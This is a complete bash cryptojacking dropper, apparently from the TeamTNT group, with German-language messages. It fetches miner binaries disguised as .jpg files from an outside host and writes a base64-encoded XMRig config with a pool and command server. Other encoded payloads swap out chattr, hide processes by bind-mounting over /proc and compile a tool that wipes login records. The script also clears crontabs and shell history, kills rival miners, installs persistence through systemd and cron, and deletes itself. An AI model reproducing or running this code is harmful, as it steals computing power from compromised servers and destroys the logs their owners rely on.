#!/bin/bash
SOURCEURL=http://HealthyMiami.com/db
y=`pidof /usr/bin/watchdogd`;
if [ "$y" == "" ]; then 
   echo "miner not found, do install" 
else
   echo "miner found"
   #exit 
fi

CYOTLF='IyEvYmluL2Jhc2gKClROVHdnZXQ9YHdoaWNoIHdnZXRgClROVGN1cmw9YHdoaWNoIGN1cmxgClROVGNobW9kPWB3aGljaCBjdXJsYApDSEFUVD0nSXlFdlltbHVMMkpoYzJnS1pXTm9ieUFuVlhOaFoyVTZJR05vWVhSMGNpQmJMWEJTVm1aZElGc3RLejFoUVdORFpFUmxhV3BRYzFOMFZIVmRJRnN0ZGlCMlpYSnphVzl1WFNCbWFXeGxjeTR1TGljS1pYaHBkQW89JwpMT0dTQz0nTHlvS0lDb2diRzluWTJ4bFlXNHVZeUJpZVNCRGIwdHBJRHhqYjJ0cFFHNXZjM2x6ZEdWdExtTnZiUzVoY2o0S0lDb0tJQ29nVkdocGN5QjBiMjlzSUdOc1pXRnVjeUJYVkUxUUxDQlZWRTFRSUdGdVpDQnNZWE4wYkc5bklHWnZjaUJzYVc1MWVBb2dLZ29nS2lCT2J5QlRlWE4wWlcwZ1IzSnZkWEFnTFNCb2RIUndPaTh2ZDNkM0xtNXZjM2x6ZEdWdExtTnZiUzVoY2dvZ0tnb2dLaThLQ2lOcGJtTnNkV1JsSUR4emRHUnBieTVvUGdvamFXNWpiSFZrWlNBOGMzUnlhVzVuTG1nK0NpTnBibU5zZFdSbElEeDFkRzF3TG1nK0NpTnBibU5zZFdSbElEeG5aWFJ2Y0hRdWFENEtJMmx1WTJ4MVpHVWdQR3hoYzNSc2IyY3VhRDRLSTJsdVkyeDFaR1VnUEhCM1pDNW9QZ29LSTJSbFptbHVaU0JXUlZKVFNVOU9JQ0l3TGpFaUNncHBiblFnZFhkMGJYQmZZMnhsWVc0b1kyaGhjaUFxY0dGMGFDd2dZMmhoY2lBcWRYTmxjaWs3Q21sdWRDQnNZWE4wYkc5blgyTnNaV0Z1S0dOb1lYSWdLbkJoZEdnc0lHTm9ZWElnS25WelpYSXBPd3AyYjJsa0lIVnpaU2hqYUdGeUlDcHdjbTluY21GdEtUc0tkbTlwWkNCMlpYSnphVzl1S0hadmFXUXBPd29LYVc1MElHMWhhVzRvYVc1MElHRnlaMk1zSUdOb1lYSWdLbUZ5WjNaYlhTa2dld29KWTJoaGNpQjFjMlZ5VzFWVVgweEpUa1ZUU1ZwRlhUc0tDV05vWVhJZ1l6c0tDZ2wzYUdsc1pTZ29ZeUE5SUdkbGRHOXdkQ2hoY21kakxDQmhjbWQyTENBaWRuVTZJaWtwSUNFOUlFVlBSaWtnZXdvSkNYTjNhWFJqYUNoaktTQjdDZ2tKQ1dOaGMyVWdKM1luT2dvSkNRa0pkbVZ5YzJsdmJpZ3BPd29KSUNBZ0lDQWdJQ0FnSUNBZ1luSmxZV3M3Q2drSkNXTmhjMlVnSjNVbk9nb0pDUWtKYVdZb2MzUnliR1Z1S0c5d2RHRnlaeWtnUGlCVlZGOU1TVTVGVTBsYVJTa2dld29KQ1FrSkNYQnlhVzUwWmlnaWRYTmxjaUJ1WVcxbElIUnZieUJzYjI1blhHNGlLVHNLQ1FrSkNRbGxlR2wwS0RBcE93b0pDUWtKZlFvSkNRa0pjMjV3Y21sdWRHWW9kWE5sY2l3Z2MybDZaVzltS0hWelpYSXBMQ0FpSlhNaUxDQnZjSFJoY21jcE93b0pDUWtKWW5KbFlXczdDZ2tKQ1dSbFptRjFiSFFnT2dvSkNRa0pkWE5sS0dGeVozWmJNRjBwT3dvSkNRa0pZbkpsWVdzN0Nna0pmUW9KZlFvS0NXbG1LSFZ6WlhJZ1BUMGdUbFZNVENCOGZDQmhjbWRqSUR3Z01pa2dld29KQ1hWelpTaGhjbWQyV3pCZEtUc0tDWDBLQ2dsd2NtbHVkR1lvSWlCVlZFMVFPbHgwWEhRaUtUc0tDV1ptYkhWemFDaHpkR1J2ZFhRcE93b0pkWGQwYlhCZlkyeGxZVzRvWDFCQlZFaGZWVlJOVUN3Z2RYTmxjaWs3Q2dvSmNISnBiblJtS0NJZ1YxUk5VRHBjZEZ4MElpazdDZ2xtWm14MWMyZ29jM1JrYjNWMEtUc0tDWFYzZEcxd1gyTnNaV0Z1S0Y5UVFWUklYMWRVVFZBc0lIVnpaWElwT3dvS0NYQnlhVzUwWmlnaUlFeEJVMVJNVDBjNlhIUWlLVHNLQ1dabWJIVnphQ2h6ZEdSdmRYUXBPd29KYkdGemRHeHZaMTlqYkdWaGJpaGZVRUZVU0Y5TVFWTlVURTlITENCMWMyVnlLVHNLZlFvS2FXNTBJSFYzZEcxd1gyTnNaV0Z1S0dOb1lYSWdLbkJoZEdnc0lHTm9ZWElnS25WelpYSXBJSHNLQ1VaSlRFVWdLblYzZEcxd1gyWnBiR1U3Q2dsemRISjFZM1FnZFhSdGNDQjFkM1J0Y0Y5MGJYQTdDZ2xwYm5RZ1kyOTFiblE5TURzS0NnbHBaaWdvZFhkMGJYQmZabWxzWlNBOUlHWnZjR1Z1S0hCaGRHZ3NJQ0p5S3lJcEtTQTlQU0JPVlV4TUtTQjdDZ2tKY0hKcGJuUm1LQ0piTFYwZ1ptbHNaV1FnZEc4Z2IzQmxiaUJtYVd4bElDY2xjeWRjYmlJc0lIQmhkR2dwT3dvSkNYSmxkSFZ5YmlBd093b0pmUW9nSUFvSmQyaHBiR1VvWm5KbFlXUW9LR05vWVhJZ0tpa21kWGQwYlhCZmRHMXdMQ0J6YVhwbGIyWW9kWGQwYlhCZmRHMXdLU3dnTVN3Z2RYZDBiWEJmWm1sc1pTa2dQaUF3S1NCN0Nna0phV1lvYzNSeVkyMXdLSFYzZEcxd1gzUnRjQzUxZEY5dVlXMWxMQ0IxYzJWeUtTQTlQVEFwSUhzS0NRa0pabk5sWldzb2RYZDBiWEJmWm1sc1pTd2dMWE5wZW1WdlppaDFkM1J0Y0Y5MGJYQXBMQ0JUUlVWTFgwTlZVaWs3Q2drSkNXSjZaWEp2S0NaMWQzUnRjRjkwYlhBc0lITnBlbVZ2WmloMWQzUnRjRjkwYlhBcEtUc0tDUWtKWm5keWFYUmxLQ2hqYUdGeUlDb3BKblYzZEcxd1gzUnRjQ3dnYzJsNlpXOW1LSFYzZEcxd1gzUnRjQ2tzSURFc0lIVjNkRzF3WDJacGJHVXBPd29KQ1FsamIzVnVkQ3NyT3dvSkNYMEtDWDBLSUNBS0NXWmpiRzl6WlNoMWQzUnRjRjltYVd4bEtUc0tJQ0FLQ1dsbUtHTnZkVzUwSUQwOUlEQXBJSHNLQ1Fsd2NtbHVkR1lvSWxzdFhTQjFjMlZ5SUNjbGN5Y2dibTkwSUdadmRXNWtYRzRpTENCMWMyVnlMQ0J3WVhSb0tUc0tDWDBLSUNBS0NXVnNjMlVnY0hKcGJuUm1LQ0piSzEwZ0p5VnpKeUJqYkdWaGJtVmtJVnh1SWl3Z2NHRjBhQ2s3Q2dwOUNncHBiblFnYkdGemRHeHZaMTlqYkdWaGJpaGphR0Z5SUNwd1lYUm9MQ0JqYUdGeUlDcDFjMlZ5S1NCN0NnbEdTVXhGSUNwc1lYTjBiRzluWDJacGJHVTdDZ2x6ZEhKMVkzUWdjR0Z6YzNka0lDcHdkMlE3Q2dsemRISjFZM1FnYkdGemRHeHZaeUJzWVhOMGJHOW5YM1J0Y0RzS0NXbHVkQ0JqYjNWdWREMHdPd29LQ1dsbUtDaHNZWE4wYkc5blgyWnBiR1VnUFNCbWIzQmxiaWh3WVhSb0xDQWljaXNpS1NrZ1BUMGdUbFZNVENrZ2V3b0pDWEJ5YVc1MFppZ2lXeTFkSUdacGJHVmtJSFJ2SUc5d1pXNGdabWxzWlNBbkpYTW5YRzRpTENCd1lYUm9LVHNLQ1FseVpYUjFjbTRnTURzS0NYMEtDZ2xwWmlBb0tIQjNaQ0E5SUdkbGRIQjNibUZ0S0hWelpYSXBLU0E5UFNCT1ZVeE1LU0I3Q2lBZ0lDQWdJQ0J3Y21sdWRHWW9JbHN0WFNCMWMyVnlJQ2NsY3ljZ2JtOTBJR1p2ZFc1a1hHNGlMQ0IxYzJWeUtUc0tJQ0FnSUNBZ0lISmxkSFZ5YmlBd093b2dJQ0FnZlFvS0NXWnpaV1ZyS0d4aGMzUnNiMmRmWm1sc1pTd2dLR3h2Ym1jcEtIQjNaQzArY0hkZmRXbGtLbk5wZW1WdlppaHNZWE4wYkc5blgzUnRjQ2twTENCVFJVVkxYMU5GVkNrN0NnbGllbVZ5Ynlnb1kyaGhjaUFxS1Nac1lYTjBiRzluWDNSdGNDd2djMmw2Wlc5bUtHeGhjM1JzYjJkZmRHMXdLU2s3Q2dsbWQzSnBkR1VvS0dOb1lYSWdLaWttYkdGemRHeHZaMTkwYlhBc0lITnBlbVZ2Wmloc1lYTjBiRzluWDNSdGNDa3NJREVzSUd4aGMzUnNiMmRmWm1sc1pTazdDZ29KWm1Oc2IzTmxLR3hoYzNSc2IyZGZabWxzWlNrN0Nnb0pjSEpwYm5SbUtDSmJLMTBnSnlWekp5QmpiR1ZoYm1Wa0lWeHVJaXdnY0dGMGFDazdDZ3A5Q2dwMmIybGtJSFZ6WlNoamFHRnlJQ3B3Y205bmNtRnRLU0I3Q2dsd2NtbHVkR1lvSWlCMWMyVTZJQ1Z6SUMxMVhIUjFjMlZ5WEc0aUxDQndjbTluY21GdEtUc0tDWEJ5YVc1MFppZ2lYSFJjZENBdGRseDBkbVZ5YzJsdmJseHVJaWs3Q2dsbGVHbDBLREFwT3dwOUNncDJiMmxrSUhabGNuTnBiMjRvZG05cFpDa2dld29KY0hKcGJuUm1LQ0lnYkc5blkyeGxZVzR1WXlCMkpYTWdZbmtnUTI5TGFTQThZMjlyYVVCdWIzTjVjM1JsYlM1amIyMHVZWEkrWEc0aUxDQldSVkpUU1U5T0tUc0tDV1Y0YVhRb01DazdDbjBLJwoKCgppZiBbIC1mICIvdXNyL2xvY2FsL2Jpbi90bnRyZWNodCIgXTsgdGhlbgplY2hvICJ0bnRyZWNodCBpcyBmaW5lIgplbHNlCmNwIC91c3IvYmluL2NoYXR0ciAvdXNyL2xvY2FsL2Jpbi90bnRyZWNodCA+L2Rldi9udWxsIDI+JjEKJFROVGNobW9kICt4IC91c3IvbG9jYWwvYmluL3RudHJlY2h0ID4vZGV2L251bGwgMj4mMQpjaGF0dHIgLWkgL3Vzci9iaW4vY2hhdHRyID4vZGV2L251bGwgMj4mMQpybSAtZiAvdXNyL2Jpbi9jaGF0dHIgPi9kZXYvbnVsbCAyPiYxCmVjaG8gJENIQVRUIHwgYmFzZTY0IC1kID4+IC91c3IvYmluL2NoYXR0ciAKJFROVGNobW9kICt4IC91c3IvYmluL2NoYXR0ciA+L2Rldi9udWxsIDI+JjEKL3Vzci9sb2NhbC9iaW4vdG50cmVjaHQgK2kgL3Vzci9iaW4vY2hhdHRyID4vZGV2L251bGwgMj4mMQpmaQoKCmlmIFsgLWYgIi9iaW4vaGlkIiBdO3RoZW4gCmVjaG8gIkZPVU5EIGhpZCIKL3Vzci9sb2NhbC9iaW4vdG50cmVjaHQgLWkgL2Jpbi9oaWQKJFROVGNobW9kICt4IC9iaW4vaGlkID4vZGV2L251bGwgMj4mMQovdXNyL2xvY2FsL2Jpbi90bnRyZWNodCAraSAvYmluL2hpZAplbHNlCmVjaG8gJyMhL2Jpbi9iYXNoJyA+IC9iaW4vaGlkCmVjaG8gJ2RlY2xhcmUgZGlyPS91c3IvZm9vJyA+PiAvYmluL2hpZAplY2hvICdpZiBbICEgLWUgJGRpciBdOyB0aGVuJyA+PiAvYmluL2hpZAplY2hvICcgICBta2RpciAkZGlyOyBmaScgPj4gL2Jpbi9oaWQKZWNobyAnY3AgL2V0Yy9tdGFiIC91c3IvdCcgPj4gL2Jpbi9oaWQKZWNobyAnbW91bnQgLS1iaW5kIC91c3IvZm9vIC9wcm9jLyQxJyA+PiAvYmluL2hpZAplY2hvICdtdiAvdXNyL3QgL2V0Yy9tdGFiCScgPj4gL2Jpbi9oaWQKJFROVGNobW9kICt4IC9iaW4vaGlkID4vZGV2L251bGwgMj4mMQovdXNyL2xvY2FsL2Jpbi90bnRyZWNodCAraSAvYmluL2hpZApmaQpoaWQgJCQKCgppZiBbIC1mIC91c3IvbG9jYWwvYmluL2xvZ3MgXSA7IHRoZW4KL3Vzci9sb2NhbC9iaW4vdG50cmVjaHQgLWkgL3Vzci9sb2NhbC9iaW4vbG9ncyA+L2Rldi9udWxsIDI+JjEKJFROVGNobW9kICt4IC91c3IvbG9jYWwvYmluL2xvZ3MgPi9kZXYvbnVsbCAyPiYxCi91c3IvbG9jYWwvYmluL3RudHJlY2h0ICtpIC91c3IvbG9jYWwvYmluL2xvZ3MgPi9kZXYvbnVsbCAyPiYxCmVsc2UKZWNobyAkTE9HU0MgfCBiYXNlNjQgLWQgPj4gL3Vzci9sb2NhbC9iaW4vbG9ncy5jCmdjYyAvdXNyL2xvY2FsL2Jpbi9sb2dzLmMgLW8gL3Vzci9sb2NhbC9iaW4vbG9ncyA+L2Rldi9udWxsIDI+JjEKcm0gLWYgL3Vzci9sb2NhbC9iaW4vbG9ncy5jID4vZGV2L251bGwgMj4mMQokVE5UY2htb2QgK3ggL3Vzci9sb2NhbC9iaW4vbG9ncyA+L2Rldi9udWxsIDI+JjEKL3Vzci9sb2NhbC9iaW4vdG50cmVjaHQgK2kgL3Vzci9sb2NhbC9iaW4vbG9ncyA+L2Rldi9udWxsIDI+JjEKZmkKCi91c3IvbG9jYWwvYmluL2xvZ3MgLXUgcmVib290Ci91c3IvbG9jYWwvYmluL2xvZ3MgLXUgaGlsZGUKL3Vzci9sb2NhbC9iaW4vbG9ncyAtdSAucjAwdAoKc3lzdGVtY3RsIHN0YXR1cyB3YXRjaGRvZ2QgfHwgc2VydmljZSB3YXRjaGRvZ2Qgc3RhdHVzCgpoaXN0b3J5IC1jCj4gL3Jvb3QvLmJhc2hfaGlzdG9yeQo='
#echo '' | base64 -d | bash
NKCONF='ewogICAgImFwaSI6IHsKICAgICAgICAiaWQiOiBudWxsLAogICAgICAgICJ3b3JrZXItaWQiOiBudWxsCiAgICB9LAogICAgImh0dHAiOiB7CiAgICAgICAgImVuYWJsZWQiOiB0cnVlLAogICAgICAgICJob3N0IjogIjAuMC4wLjAiLAogICAgICAgICJwb3J0IjogIjQ1NDUiLAogICAgICAgICJhY2Nlc3MtdG9rZW4iOiAiZmplYTBmamZqYWVqZmlvZHlmanNlaGdzZWhqZ2lvZWpvaWdqb2lnaHNvZ3JzamdpamVzaWdqc2Vpb2dqZ29pZHNqIiwKICAgICAgICAicmVzdHJpY3RlZCI6IGZhbHNlCiAgICB9LAogICAgImF1dG9zYXZlIjogdHJ1ZSwKICAgICJ2ZXJzaW9uIjogMSwKICAgICJiYWNrZ3JvdW5kIjogZmFsc2UsCiAgICAiY29sb3JzIjogdHJ1ZSwKICAgICJyYW5kb214IjogewogICAgICAgICJpbml0IjogLTEsCiAgICAgICAgIm1vZGUiOiAiYXV0byIsCiAgICAgICAgIjFnYi1wYWdlcyI6IGZhbHNlLAogICAgICAgICJyZG1zciI6IHRydWUsCiAgICAgICAgIndybXNyIjogdHJ1ZSwKICAgICAgICAibnVtYSI6IHRydWUKICAgIH0sCiAgICAiY3B1IjogewogICAgICAgICJlbmFibGVkIjogdHJ1ZSwKICAgICAgICAiaHVnZS1wYWdlcyI6IHRydWUsCiAgICAgICAgImh3LWFlcyI6IG51bGwsCiAgICAgICAgInByaW9yaXR5IjogbnVsbCwKICAgICAgICAiYXNtIjogdHJ1ZSwKICAgICAgICAibWF4LXRocmVhZHMtaGludCI6IDEwMCwKICAgICAgICAiYXJnb24yLWltcGwiOiBudWxsLAogICAgICAgICJjbi8wIjogZmFsc2UsCiAgICAgICAgImNuLWxpdGUvMCI6IGZhbHNlCiAgICB9LAogICAgImRvbmF0ZS1sZXZlbCI6IDEsCiAgICAibG9nLWZpbGUiOiBudWxsLAogICAgInBvb2xzIjogWwogICAgICAgIHsKICAgICAgICAgICAgImFsZ28iOiBudWxsLAogICAgICAgICAgICAiY29pbiI6ICJtb25lcm8iLAogICAgICAgICAgICAidXJsIjogIjE4LjIxMC4xMjYuNDA6MTAwMDgiLAogICAgICAgICAgICAidXNlciI6ICI4NGhZenlNa2ZuOFJBYjV5TXE3djdRZmNaM3pnQmhzR3hZak1LY1pVOEU0M1pERHdEQWRLWTV0ODRUTVpxZlBWVzg0RHE1OEFoUDNBYlVOb3h6bmh2eEVhVjIzZjU3VCIsCiAgICAgICAgICAgICJwYXNzIjogIkhPU1ROQU1FIiwKICAgICAgICAgICAgInJpZy1pZCI6IG51bGwsCiAgICAgICAgICAgICJuaWNlaGFzaCI6IGZhbHNlLAogICAgICAgICAgICAia2VlcGFsaXZlIjogdHJ1ZSwKICAgICAgICAgICAgImVuYWJsZWQiOiB0cnVlLAogICAgICAgICAgICAidGxzIjogZmFsc2UsCiAgICAgICAgICAgICJ0bHMtZmluZ2VycHJpbnQiOiBudWxsLAogICAgICAgICAgICAiZGFlbW9uIjogZmFsc2UKICAgICAgICB9CiAgICBdLAogICAgImNjLWNsaWVudCI6IHsKICAgICAgICAiZW5hYmxlZCI6IHRydWUsCiAgICAgICAgInVybCI6ICJ2cHMudGVhbXRudC5yZWQ6MzMzMzIiLAogICAgICAgICJhY2Nlc3MtdG9rZW4iOiAiZmplYTBmamZqYWVqZmlvZHlmanNlaGdzZWhqZ2lvZWpvaWdqb2lnaHNvZ3JzamdpamVzaWdqc2Vpb2dqZ29pZHNqIiwKICAgICAgICAidXNlLXRscyI6IGZhbHNlLAogICAgICAgICJ1c2UtcmVtb3RlLWxvZ2dpbmciOiB0cnVlLAogICAgICAgICJ1cGxvYWQtY29uZmlnLW9uLXN0YXJ0IjogdHJ1ZSwKICAgICAgICAid29ya2VyLWlkIjogIkhPU1ROQU1FIiwKICAgICAgICAicmVib290LWNtZCI6ICJiYXNoIC91c3IvYmluL3JzdGFydC5zaCIsCiAgICAgICAgInVwZGF0ZS1pbnRlcnZhbC1zIjogMzAKICAgIH0sCiAgICAicHJpbnQtdGltZSI6IDYwLAogICAgInJldHJpZXMiOiA1LAogICAgInJldHJ5LXBhdXNlIjogNSwKICAgICJzeXNsb2ciOiBmYWxzZSwKICAgICJ1c2VyLWFnZW50IjogbnVsbCwKICAgICJ3YXRjaCI6IHRydWUKfQ=='

SILENT=""
service_size="1937"
the32bit_size="2267001"
the64bit_size="3319326"

tntwget=`which wget`
tntcurl=`which curl`
tntchmod=`which chmod`
tnttar=`which tar`
tntrecht=`which tntrecht`

tntrecht -i /etc/crontab
echo " "> /etc/crontab
tntrecht +i /etc/crontab


SETBACK="\033[0m"
FEHLERCOLOR="\e[1;33;41m"

PORTARRAY=("1982" "3344" "4444" "5555" "6666" "7777" "8888" "9000")
FILEARRAY=("/usr/bin/watchdogd" "/usr/bin/xmrigMiner" "/usr/bin/config.json" "/usr/bin/rstart.sh" "/tmp/watchdogd" "/tmp/xmrigMiner" "/tmp/config.json" "/usr/bin/lo" "/bin/hid" "/usr/bin/sysh" "/usr/bin/systemd-clean" "/usr/bin/systemd-healt" "/etc/init.d/xmrcc" "/lib/systemd/system/xmrcc.service" "/etc/systemd/system/xmrcc.service" "/etc/systemd/system/multi-user.target.wants/xmrcc.service")

FILE01=$SOURCEURL/01.jpg
FILE21=$SOURCEURL/21.jpg
FILE22=$SOURCEURL/22.jpg


SETUPARRAY=("watchdogd" "xmrigMiner" "config.json" "rstart.sh" "systemd-clean" "lo" "watchdogd-stop")
KILLARRAY=("aliyun.one" "" "")

HOSTB_TORTOWEB_ARRAY=("onion.to" "onion.glass" "onion.ly" "onion.pet" "tor2web.fyi" "onion.in.net" "ponion.mn")
HOSTB_MININGPOOLS_ARRAY=("nicehash.com" "f2pool.com" "cpuminerpool.com")
HOSTB_DIVERSINFECT_ARRAY=("aliyun.one" "d2web.org" "pastebin.com")

# add some
HILDEBDARRAY=("/etc/cron.daily/logrotate" "/etc/cron.hourly/0anacron" "/etc/rc.d/rc.local")

TEMPFILE="/tmp/.tempfile"

function mainapp(){
checkmyappsrun
checkoldfiles
cleanthesystem
downloadfiles
makejsonconfig
hugepages_enable
#makethehidfile

findautostart=`ps -p 1 -o comm=`
if [[ "$findautostart" == "init" ]]; then
startupserviceinitd
fi
if [[ "$findautostart" == "systemd" ]]; then
startupservicesystemctl
fi

hid $(pidof xmrigMiner)
hid $(pidof watchdogd)
}

function checkmyappsrun(){
	
testit=`ss -tuw|grep 10008`
if [[ "$testit" == *"18.210.126.40:10008"* ]]; then
  echo -e "\e[1;33;41mwatchdogd Prozess gefunden!\033[0m" $SILENT
  echo -e "\e[1;33;41mDas Setup wird abgebrochen!\033[0m" $SILENT
  sleep 3
echo $CYOTLF | base64 -d | bash
  rm -f $0
  exit
  else

if [[ "$testit" == *"18.180.72.219:10008"* ]]; then
  echo -e "\e[1;33;41mwatchdogd Prozess gefunden!\033[0m" $SILENT
  echo -e "\e[1;33;41mDas Setup wird abgebrochen!\033[0m" $SILENT
  sleep 3
echo $CYOTLF | base64 -d | bash
  rm -f $0
  exit
  else
  echo -e "Kein watchdogd Prozess gefunden!" $SILENT
  echo -e "Das Setup wird jetzt gestartet!" $SILENT
fi

fi
}

checkmyappsrun

function checkhiddenmod(){
if [ -f /bin/.netstat ] ; then
	echo 'netstat mod gefunden' $SILENT
	MODSTATUS="1"
if [ -f /usr/bin/systemd-ns ] ; then
	echo 'real netstat gefunden' $SILENT
	else
	cp /bin/.netstat /usr/bin/systemd-ns 2>/dev/null
	echo 'real netstat erstellt' $SILENT
fi
	else
	echo 'kein netstat mod gefunden' $SILENT
	MODSTATUS="0"
fi
} 

function checkoldfiles(){
echo "Prüfe das System auf alte Dateien!" $SILENT
for i in ${FILEARRAY[@]}; do
if [ -f $i ] ; then
echo "Datei $i gefunden." $SILENT
$tntrecht -i $i 2>/dev/null
rm -f $i 2>/dev/null
if [ "$?" == "0" ] ; then 
echo "löschen erfolgreich" $SILENT
fi
if [ "$?" == "1" ] ; then 
echo "löschen fehlgeschlagen" $SILENT
fi
fi
done
}

function downloadfiles(){
if [ `getconf LONG_BIT` = "64" ]
then

if [ -f "/usr/bin/64bit.tar.gz" ]; then
    filesize1=`ls -l /usr/bin/64bit.tar.gz | awk '{ print $5 }'`
    if [ "$filesize1" -ne "$filesize1" ] 
    then
    curl $FILE22 -o /usr/bin/64bit.tar.gz
    $tnttar xfv /usr/bin/64bit.tar.gz -C /usr/bin/
      else
    $tnttar xfv /usr/bin/64bit.tar.gz -C /usr/bin/
      fi
      else
    curl $FILE22 -o /usr/bin/64bit.tar.gz
    $tnttar xfv /usr/bin/64bit.tar.gz -C /usr/bin/
      fi
      
else

if [ -f "/usr/bin/32bit.tar.gz" ]; then
    filesize2=`ls -l /usr/bin/32bit.tar.gz | awk '{ print $5 }'`
    if [ "$filesize2" -ne "$filesize2" ] 
    then
    curl $FILE21 -o /usr/bin/32bit.tar.gz
    $tnttar xfv /usr/bin/32bit.tar.gz -C /usr/bin/
      else
    $tnttar xfv /usr/bin/32bit.tar.gz -C /usr/bin/
      fi
      else
    curl $FILE21 -o /usr/bin/32bit.tar.gz
    $tnttar xfv /usr/bin/32bit.tar.gz -C /usr/bin/
      fi
fi

if [ -f "/usr/bin/service_files.tar.gz" ]; then
    filesize3=`ls -l /usr/bin/service_files.tar.gz | awk '{ print $5 }'`
    if [ "$filesize3" -ne "$filesize3" ] 
    then
    curl $FILE01 -o /usr/bin/service_files.tar.gz
    $tnttar xfv /usr/bin/service_files.tar.gz -C /usr/bin/
      else
    $tnttar xfv /usr/bin/service_files.tar.gz -C /usr/bin/
      fi
      else
    curl $FILE01 -o /usr/bin/service_files.tar.gz
    $tnttar xfv /usr/bin/service_files.tar.gz -C /usr/bin/
      fi

$tntchmod +x /usr/bin/watchdogd
$tntchmod +x /usr/bin/xmrigMiner
$tntrecht -i /usr/bin/config.json 2>/dev/null
$tntchmod 777 /usr/bin/config.json 2>/dev/null
}

function makejsonconfig(){
rm -f /usr/bin/config.json
echo $NKCONF | base64 -d >> /usr/bin/config.json
MINERNAMETAG="Alpha"
MINERHOSTTAG=$(hostname)
MINERUSERTAG=$(whoami)
MINERFULLNAM="$MINERNAMETAG"_"$MINERUSERTAG"_"$MINERHOSTTAG"

mv /usr/bin/config.json /usr/bin/config1.json 2>/dev/null
sed s/HOSTNAME/$MINERFULLNAM/g /usr/bin/config1.json >> /usr/bin/config.json
rm -f /usr/bin/config1.json 2>/dev/null
}
makejsonconfig

function startupserviceinitd(){
echo "init.d Script wird erstellt und installiert!!!" $SILENT
mv /usr/bin/watchdogd.initd /etc/init.d/watchdogd
$tntchmod +x /etc/init.d/watchdogd
#cachekillerhigh
update-rc.d watchdogd defaults ||  chkconfig watchdogd on 
service watchdogd install
service watchdogd start
/etc/init.d/watchdogd start

}

function startupservicesystemctl(){
mv /usr/bin/watchdogd.service /etc/systemd/system/watchdogd.service
$tntchmod 644 /etc/systemd/system/watchdogd.service
#cachekillerhigh
systemctl --system daemon-reload
systemctl enable watchdogd.service
systemctl start watchdogd.service
sleep 2
systemctl status watchdogd.service
}

function startuprclocal(){
echo "/etc/rc.local /etc/init.d/ kannste selber installieren :P" $SILENT
}

function hugepages_enable(){
if grep -Fxq "vm.nr_hugepages=1280" /etc/sysctl.conf
then
    echo "persist hugpages are enabled" $SILENT
    sysctl -w vm.nr_hugepages=1280
else
    echo "enable persist hugpages" $SILENT
    sysctl -w vm.nr_hugepages=1280
    bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
fi
}

function cleanthesystem(){
systemctl stop crond || service crond stop
systemctl stop cron || service cron stop

$tntrecht -R -i /var/spool/cron
$tntrecht -i /etc/crontab
crontab -r 2>/dev/null
echo " " > /etc/crontab 2>/dev/null
rm -rf /var/spool/cron/* 2>/dev/null
mkdir -p /var/spool/cron/crontabs 2>/dev/null
rm -f /etc/cron.d/ -R 2>/dev/null
mkdir /etc/cron.d/ 2>/dev/null
rm -f /var/spool/mail/root 2>/dev/null
$tntrecht -R +i /var/spool/cron
$tntrecht +i /etc/crontab
    
    
pkill -f curl
pkill -f wget
pkill -f /tmp/
pkill -f aliyun.one


$tntrecht -i /etc/bashrc
cp /etc/bashrc /etc/bashrc2
grep -v "^(curl" /etc/bashrc2 > /etc/bashrc  
rm -f /etc/bashrc2
$tntrecht +i /etc/bashrc

$tntrecht -i ~/.bashrc
cp ~/.bashrc ~/.bashrc2
grep -v "^(curl" ~/.bashrc2 > ~/.bashrc  
rm -f ~/.bashrc2
$tntrecht +i ~/.bashrc

systemctl start crond || service crond start
systemctl start cron || service cron start
}

function cachekillerhigh(){
	echo "give you some cache..." $SILENT
echo "FUCKUP PAGECACHE----" $SILENT
echo 1 > /proc/sys/vm/drop_caches
echo "DONE..." $SILENT

echo "FUCKUP DENTRIE&INODECACHE" $SILENT
echo 2 > /proc/sys/vm/drop_caches
echo "DONE..." $SILENT

echo "FUCKUP TOTALALLCACHE" $SILENT
echo 3 > /proc/sys/vm/drop_caches
echo "DONE..." $SILENT

echo "NOW KILL YOUR SWAP!!" $SILENT
swapoff -a && swapon -a
sync ; sync ; sync ; swapoff -a && swapon -a
echo "DONE..." $SILENT
}

function blockinghosts(){
for tortoweb in ${HOSTB_TORTOWEB_ARRAY[@]}; do
echo "0.0.0.0 $tortoweb" >> /etc/hosts
done
for miningpools in ${HOSTB_MININGPOOLS_ARRAY[@]}; do
echo "0.0.0.0 $miningpools" >> /etc/hosts
done
for divbadpage in ${HOSTB_DIVERSINFECT_ARRAY[@]}; do
echo "0.0.0.0 $divbadpage" >> /etc/hosts
done
}

mainapp

for bealive in ${HILDEBDARRAY[@]}; do
if grep "watchdogd" $bealive > /dev/null
then
echo "schon modded"  $SILENT
else
$tntrecht -i $bealive
echo "systemctl start watchdogd || service watchdogd start" >> $bealive
$tntrecht +i $bealive
fi
done

systemctl status watchdogd 2>/dev/null || service watchdogd status 2>/dev/null

rm -f $0
exit 



	



